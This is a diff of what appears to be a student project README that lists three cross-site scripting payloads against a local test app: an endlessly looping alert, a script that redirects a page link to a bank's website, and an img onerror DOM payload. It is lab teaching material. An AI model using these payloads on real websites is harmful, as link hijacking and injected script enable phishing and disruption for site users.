@@ -5,7 +5,7 @@ By Hitesh, Pranati and Saumya.
 Attack Scripts:
 1. Reflected Attack:http://127.0.0.1:5000/search?input=%3Cscript%3Evar%20str%20=%20%22YOU%20HAVE%20BEEN%20HACKED%22;%20while(1){alert(str);str+=%22%20AGAIN%22;}%3C/script%3E
 
-2. Online SBI @Posts:http://127.0.0.1:5000/search?input=%3Cscript%3Ewindow.onload%20=%20function()%20{var%20AllLinks=document.getElementsByTagName(%22a%22);%20AllLinks[2].href%20=%20%22https://www.onlinesbi.com/%22;%20}%3C/script%3E
+2. Online SBI, works whenever user tries to post anything:http://127.0.0.1:5000/search?input=%3Cscript%3Ewindow.onload%20=%20function()%20{var%20AllLinks=document.getElementsByTagName(%22a%22);%20AllLinks[2].href%20=%20%22https://www.onlinesbi.com/%22;%20}%3C/script%3E
 
 3. DOM Attack:<img src=x onerror=alert("FLAG!!!!!!!!!!!!!!!!!!!!!!!")>
 
